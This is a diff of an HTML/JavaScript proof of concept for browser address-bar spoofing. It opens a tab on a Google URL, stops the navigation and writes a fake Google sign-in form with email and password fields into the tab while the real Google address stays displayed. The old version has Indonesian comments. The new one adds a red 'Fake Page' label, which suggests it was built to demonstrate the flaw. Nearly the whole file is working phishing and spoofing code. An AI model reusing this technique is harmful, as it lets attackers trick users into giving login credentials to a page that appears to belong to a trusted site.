@@ -1,42 +1,42 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK </button>
+<button onclick="spoof()">CLICK HERE</button>
 
 <script>
 function spoof() {
-    
-    // 1) buka tab baru normal, Safari friendly
-    let win = window.open("https://www.google.com/csi", "_blank");
 
-    if(!win) return alert("Safari blocked popup, allow popup first");
+    // 1) open new tab, MUST be user interaction
+    let win = window.open("https://www.google.com:8080", "_blank");
 
-    // 2) stop cepat, tapi tidak spam
-    setTimeout(()=>{
-        try { win.stop(); }catch(e){}
-    }, 100);
+    if(!win) return alert("Please allow popups");
 
-    // 3) inject fake content halus
-    setTimeout(()=>{
+    // 2) early stop to freeze navigation
+    setTimeout(() => {
+        try { win.stop(); } catch(e){}
+    }, 120);
+
+    // 3) inject fake UI
+    setTimeout(() => {
         try{
             win.document.open();
             win.document.write(`
-                <div style="text-align:center; margin-top:60px; font-family:Arial;">
-                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" height="60">
-                    <h2>Sign in</h2>
-                    <p>Continue to Google Account</p>
-                    <input placeholder="Email" style="width:260px;height:30px;"><br><br>
-                    <input type="password" placeholder="Password" style="width:260px;height:30px;"><br><br>
-                    <button style="width:120px;height:35px;">Next</button>
+                <div style="margin-top:80px;text-align:center;font-family:-apple-system;">
+                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="180">
+                    <h2 style="font-weight:500;">Sign in</h2>
+                    <input placeholder="Email" style="width:260px;height:32px;font-size:16px;"><br><br>
+                    <input type="password" placeholder="Password" style="width:260px;height:32px;font-size:16px;"><br><br>
+                    <button style="width:100px;height:36px;font-size:16px;">Next</button>
+                    <p style="color:red;margin-top:12px;">Fake Page</p>
                 </div>
             `);
             win.document.close();
         }catch(e){}
-    }, 250);
+    }, 150);
 
-    // 4) minor location enforcement
+    // 4) minor URL enforcement
     setTimeout(()=>{
-        try{ win.location.href = "https://www.google.com/csi"; }catch(e){}
+        try{ win.location.href = "https://www.google.com:8080"; }catch(e){}
     }, 500);
 
 }
